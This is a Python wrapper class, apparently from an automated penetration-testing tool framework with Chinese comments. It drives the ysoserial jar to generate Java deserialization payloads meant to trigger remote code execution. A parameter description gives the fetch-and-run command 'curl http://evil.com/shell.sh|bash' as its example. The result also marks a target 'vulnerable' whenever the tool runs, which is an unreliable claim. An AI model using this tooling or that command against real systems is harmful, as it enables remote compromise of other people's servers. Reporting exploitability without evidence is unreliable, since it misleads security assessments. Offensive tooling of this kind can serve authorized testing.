# tools/ysoserial_tool.py
# Ysoserial - Java 反序列化 Payload 生成器
import os
import json
import subprocess
from typing import Dict, Any
from tool_framework import CommandLineTool


class YsoserialTool(CommandLineTool):
    """
    Ysoserial 封装 - Java 反序列化漏洞 Payload 生成器
    支持多种 Gadget 链生成恶意序列化数据
    """

    def __init__(self):
        super().__init__("java")
        # 路径检查 - 优先 Docker 路径，然后本地路径
        docker_jar = "/app/thirdparty/ysoserial.jar"
        local_jar = os.path.join(os.getcwd(), "thirdparty", "ysoserial", "ysoserial-all.jar") if os.getcwd() else ""
        self.jar_path = docker_jar if os.path.exists(docker_jar) else local_jar
        self.timeout = 60

    def name(self) -> str:
        return "ysoserial"

    def description(self) -> str:
        return "Java 反序列化 Payload 生成器，支持 Commons-Collections、Spring 等多种 Gadget 链"

    def supported_vulns(self) -> list:
        return ["Java Deserialization", "Insecure Deserialization", "RCE", "Object Injection"]

    def capability_statement(self) -> str:
        return "Java反序列化Payload生成器。生成恶意序列化数据触发RCE。适合：Java应用、检测到序列化数据、已知反序列化漏洞点。需配合JNDI或文件上传使用。"

    def check_available(self) -> bool:
        # 检查 Java 和 ysoserial.jar
        import shutil
        java_exists = shutil.which("java") is not None
        jar_exists = self.jar_path is not None and os.path.exists(self.jar_path)
        return java_exists and jar_exists

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "gadget": {
                "type": "str",
                "description": "Gadget 链名称，如 CommonsCollections1, URLDNS, Jdk7u21 等",
                "required": True
            },
            "command": {
                "type": "str",
                "description": "要执行的命令，如 'curl http://evil.com/shell.sh|bash'",
                "required": True
            },
            "encode": {
                "type": "str",
                "description": "编码格式: base64, hex, raw (默认 raw)",
                "required": False,
                "default": "raw"
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        gadget = params.get("gadget")
        command = params.get("command")

        if not gadget or not command:
            raise ValueError("必须提供 gadget 和 command 参数")

        # 确定 jar 路径
        jar_path = self.jar_path
        if not jar_path or not os.path.exists(jar_path):
            return {"success": False, "error": "ysoserial.jar 不存在", "vulnerable": False}

        cmd = [
            "java", "-jar", jar_path,
            gadget, command
        ]

        try:
            raw_result = self._run_command(cmd, timeout=self.timeout, stream_output=True)
            stdout = raw_result.get("stdout", "")
            stderr = raw_result.get("stderr", "")

            # 检查是否生成了 payload
            payload_generated = len(stdout) > 0 and "Exception" not in stderr

            # 编码处理
            encode = params.get("encode", "raw")
            if encode == "base64" and payload_generated:
                import base64
                stdout = base64.b64encode(stdout.encode() if isinstance(stdout, str) else stdout).decode()
            elif encode == "hex" and payload_generated:
                stdout = stdout.encode().hex() if isinstance(stdout, str) else stdout.hex()

            result = {
                "success": payload_generated,
                "vulnerable": True,  # 工具调用成功即表示可以利用
                "gadget": gadget,
                "command": command,
                "encoding": encode,
                "payload_length": len(stdout) if stdout else 0,
                "payload_preview": stdout[:500] if stdout else "",
                "summary": f"生成 {gadget} 链 payload 成功，命令: {command}"
            }

            result["stdout"] = stdout
            result["stderr"] = stderr
            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "summary": f"执行失败: {str(e)}"
            }